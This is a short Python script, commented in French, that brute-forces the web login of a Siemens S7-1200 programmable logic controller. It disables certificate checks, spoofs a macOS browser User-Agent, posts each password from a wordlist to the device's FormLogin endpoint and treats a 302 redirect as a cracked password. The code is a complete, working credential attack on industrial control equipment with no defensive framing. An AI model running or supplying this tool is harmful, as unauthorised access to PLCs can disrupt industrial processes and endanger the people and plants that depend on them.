import requests
import urllib3
import time

# Désactiver les alertes SSL (indispensable pour les automates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def brute_siemens_mac(ip, user, wordlist_path):
    s = requests.Session()
    
    # Headers pour simuler un navigateur macOS (Safari/Chrome)
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,xml;q=0.9,*/*;q=0.8'
    })

    # URL d'intro pour ouvrir la session
    intro_url = f"https://{ip}/Portal/Portal.mwsl?intro_enter_button=ENTR%C3%89E&PriNav=Start&coming_from_intro=true"
    login_url = f"https://{ip}/FormLogin"

    print(f"[*] Initialisation sur Siemens S7-1200 ({ip})")
    
    try:
        # Étape 1 : On "pousse" la porte d'entrée
        s.get(intro_url, verify=False, timeout=5)
        
        # Étape 2 : Le Brute Force
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            for line in f:
                mdp = line.strip()
                payload = {
                    "Login": user,
                    "Password": mdp,
                    "Redirection": "value"
                }
                
                try:
                    # allow_redirects=False est LA clé pour attraper le code 302
                    r = s.post(login_url, data=payload, verify=False, allow_redirects=False, timeout=5)
                    
                    # Si le Siemens répond 302, c'est gagné
                    if r.status_code == 302:
                        print(f"\n\n[!!!] VICTOIRE SUR MAC ! Mot de passe : {mdp}")
                        return
                    
                    print(f"[-] Essai : {mdp} (Code: {r.status_code})", end="\r")
                    
                    # Pause pour ne pas saturer le processeur de l'automate
                    time.sleep(0.3)

                except Exception as e:
                    print(f"\n[!] Erreur de connexion, l'automate sature. Pause de 2s...")
                    time.sleep(2)
                    
    except FileNotFoundError:
        print(f"[!] Erreur : Impossible de trouver le fichier {wordlist_path}")
    except Exception as e:
        print(f"[!] Erreur générale : {e}")

if __name__ == "__main__":
    # Remplace par l'IP de ton automate
    brute_siemens_mac("192.168.0.10", "admin", "mes_passwords.txt")